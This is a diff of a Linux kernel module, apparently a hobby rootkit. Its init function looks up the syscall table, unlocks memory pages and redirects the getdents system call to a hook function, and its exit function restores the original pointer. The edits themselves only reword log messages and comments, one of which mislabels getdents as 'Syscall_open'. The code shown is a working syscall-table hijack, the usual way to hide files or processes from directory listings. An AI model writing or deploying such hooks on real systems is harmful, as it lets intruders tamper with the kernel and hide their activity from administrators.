@@ -88,33 +88,28 @@ static int __init SetHooks(void) {
 	// Gets Syscall Table
  	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table");
 
-	printk(KERN_INFO "Hooks Will Be Set.\n");
+	printk(KERN_INFO "System Call Change Enabled.\n");
 	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);
 
 
 	EnablePageWriting();// Opens the memory pages to be written
 
-  // Replaces Pointer Of Syscall_open on our syscall.
-	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
+
+	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents]; //Pointer of Syscall_open is repalced and points to our function HookeGetDents
 	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)HookGetDents;
-	DisablePageWriting();
+	DisablePageWriting(); //closes memory to be written
 
 	return 0;
 }
 
 
-
-
-
-
-
 static void __exit HookCleanup(void) {
 
-	// Clean up our Hooks
 	EnablePageWriting();
-	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
+	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents; //Point to original SYS_CALL_TABLE
 	DisablePageWriting();
-	printk(KERN_INFO "HooksCleaned Up!");
+
+	printk(KERN_INFO "Everything back to normal.");
 }
 
 module_init(SetHooks);
